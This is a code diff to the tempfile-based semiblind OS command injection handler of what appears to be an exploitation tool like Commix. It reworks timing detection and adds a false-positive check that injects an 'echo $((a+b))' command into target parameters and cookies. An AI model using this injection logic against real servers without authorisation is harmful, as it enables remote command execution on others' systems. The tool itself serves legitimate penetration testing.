@@ -38,20 +38,20 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_fi
 
 """
  The "tempfile-based" injection technique on Semiblind OS Command Injection.
- __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
+ __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive results.
 """
 
 #-------------------------------------------------
 # The "tempfile-based" injection technique handler
 #-------------------------------------------------
-def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
-  
+def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, url_time_response):
   counter = 1
   vp_flag = True
   no_result = True
   is_encoded = False
   fixation = False
   export_injection_info = False
+  
   injection_type = "Semiblind-based Command Injection"
   technique = "tempfile-based injection technique"
   
@@ -64,26 +64,10 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
     print Back.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + Style.RESET_ALL
   
   num_of_chars = 0
+
   # Calculate all possible combinations
   total = len(settings.SEPARATORS)
-  
-  # Estimating the response time (in seconds)
-  request = urllib2.Request(url)
-  headers.do_check(request)
-  start = time.time()
-  response = urllib2.urlopen(request)
-  response.read(1)
-  response.close()
-  end = time.time()
-  diff = end - start
-  if int(diff) < 1:
-    url_time_response = int(diff)
-  else:
-    url_time_response = int(round(diff))
-    print Style.BRIGHT + "(!) The estimated response time is " + str(url_time_response) + " second" + "s"[url_time_response == 1:] + "." + Style.RESET_ALL
- 
-  delay = int(delay) + int(url_time_response)
-  
+    
   for separator in settings.SEPARATORS:
     num_of_chars = num_of_chars + 1
           
@@ -114,23 +98,41 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
           # Check if target host is vulnerable to cookie injection.
           vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
           how_long = tfb_injector.cookie_injection_test(url, vuln_parameter, payload)
+          
         else:
           # Check if target host is vulnerable.
           how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method, url)
 
         if not menu.options.verbose:
-          percent = ((num_of_chars*100)/total)
-          if (url_time_response <= 1 and how_long >= delay) or \
-          (url_time_response >= 2 and how_long > delay):
-            if len(TAG) == output_length :
-              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
-          elif percent == 100:
-            if no_result == True:
+          percent = ((num_of_chars * 100) / total)
+
+          if percent == 100 and no_result == True:
               percent = Fore.RED + "FAILED" + Style.RESET_ALL
+          else:
+            if (url_time_response <= 1 and how_long >= delay) or \
+            (url_time_response >= 2 and how_long > delay):
+
+              # Time relative false positive fixation.
+              if len(TAG) == output_length :
+                if fixation == True:
+                  delay = delay + 1
+              else:
+                fixation = True
+                continue
+
+              randv1 = random.randrange(0, 1)
+              randv2 = random.randrange(1, 2)
+              randvcalc = randv1 + randv2
+
+              cmd = "echo $((" + str(randv1) + "+" + str(randv2) + "))"
+              output  = tfb_injector.false_positive_check(separator, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell)
+              
+              if str(output) == str(randvcalc):
+                percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+
             else:
               percent = str(percent)+"%"
-          else:
-            percent = str(percent)+"%"
+
           sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
           sys.stdout.flush()
           
@@ -139,7 +141,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
       
       except:
         if not menu.options.verbose:
-          percent = ((num_of_chars*100)/total)
+          percent = ((num_of_chars * 100) / total)
           
           if percent == 100:
             if no_result == True:
@@ -156,16 +158,8 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
       
       # Yaw, got shellz! 
       # Do some magic tricks!
-      if (url_time_response <= 1 and how_long >= delay) or \
-      (url_time_response >= 2 and how_long > delay):
-      
-        # Time relative false positive fixation.
-        if len(TAG) == output_length :
-          if fixation == True:
-            delay = delay + 1
-        else:
-          fixation = True
-          continue
+      if ((url_time_response <= 1 and how_long >= delay) or \
+      (url_time_response >= 2 and how_long > delay)) and len(TAG) == output_length:
 
         found = True
         no_result = False
@@ -257,8 +251,8 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
 The exploitation function.
 (call the injection handler)
 """
-def exploitation(url, delay, filename, tmp_path, http_request_method):
-    if tfb_injection_handler(url, delay, filename, tmp_path, http_request_method) == False:
+def exploitation(url, delay, filename, tmp_path, http_request_method, url_time_response):
+    if tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, url_time_response) == False:
       return False
     
 #eof 
